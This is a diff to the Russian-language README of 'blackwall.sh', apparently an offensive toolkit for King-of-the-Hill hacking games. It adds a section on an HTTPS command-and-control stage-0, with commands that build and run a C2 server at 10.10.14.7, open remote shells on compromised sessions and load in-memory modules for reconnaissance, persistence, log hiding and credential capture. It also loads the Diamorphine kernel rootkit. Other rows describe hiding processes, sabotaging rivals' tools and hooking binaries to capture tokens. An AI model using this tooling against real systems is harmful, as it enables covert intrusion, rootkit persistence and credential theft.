@@ -33,6 +33,7 @@ sudo ./blackwall.sh -o map -t 10.10.10.50 --payload-path /usr/local/bin/hill
 | `-E` | **Shadow** | Скрытие процессов и логов |
 | `-T` | **Troll** | Порча инструментария конкурентов (обратимо) |
 | `-Z` | **Wall** | Ротация паролей, ключи, iptables-стена |
+| `-X` | **HTTPS C2 / Stage-0** | TLS-пиннинг, HMAC, зашифрованные модули в памяти, mTLS, модульная догрузка |
 | `-C` | **Post-Root** | Чек-лист после получения рута |
 | `-o` | **Ring-3 Hook** | Разведка и хук бинаря захвата (`map`, `uid`, `token`) |
 
@@ -136,6 +137,35 @@ sudo ./blackwall.sh -Z -t 10.10.10.50 -p 4242 --pubkey ~/.ssh/id_ed25519.pub --f
 
 ---
 
+## <font color="#ff0037">🛰️ 5.5 HTTPS C2 — STAGE-0</font>
+
+Вместо монолитного дропа и bind-порта — минимальный stage-0 и модульная
+догрузка по HTTPS.
+
+```bash
+sudo ./blackwall.sh -X build  -q --c2-host 10.10.14.7 --c2-port 8443
+sudo ./blackwall.sh -X server -q --c2-host 10.10.14.7 --c2-port 8443
+./blackwall.sh -X ctl -- sessions
+./blackwall.sh -X ctl -- shell s-1a2b3c4d 'id; hostname'
+./blackwall.sh -X ctl -- module s-1a2b3c4d recon
+```
+
+* **TLS 1.2+** с пиннингом сертификата (CA + SHA256 fingerprint);
+* **HMAC-SHA256** над method/path/timestamp/nonce/body + anti-replay;
+* **модули** (`recon`, `persist`, `shadow`, `wall`, `capture`, `troll`,
+  `diamorphine`) запечатаны и исполняются из памяти, без файлов на диске;
+  новые модули регистрируются на лету через `add-module`;
+* **start-set** задаётся при сборке (`--c2-start recon`), остальное
+  догружается оператором; артефакты по умолчанию лежат в скрываемом
+  `blk_kit`, а `BW_SECRET_B64` получает только модуль с `# SECRET: 1`;
+* **mTLS** опционально (`--c2-mtls`);
+* **Diamorphine** — опциональная зависимость: модуль `diamorphine` собирает
+  и загружает LKM, патчит `MAGIC_PREFIX` под `blk_`.
+
+Полное руководство: [`c2/README.md`](c2/README.md).
+
+---
+
 ## <font color="#ff0037">✅ 6. POST-ROOT CHECK</font>
 
 ```bash
@@ -171,7 +201,8 @@ king/
 ├── preload.sh       ring-3 hook (map / uid / token)
 ├── troll.sh         reversible sabotage + guidance
 ├── wall.sh          credential rotation / keys / firewall
-└── check.sh         post-root checklist
+├── check.sh         post-root checklist
+└── c2/              HTTPS stage-0 + sealed modules (see c2/README.md)
 ```
 
 ![Terminal](../assets/koth_terminal.svg)
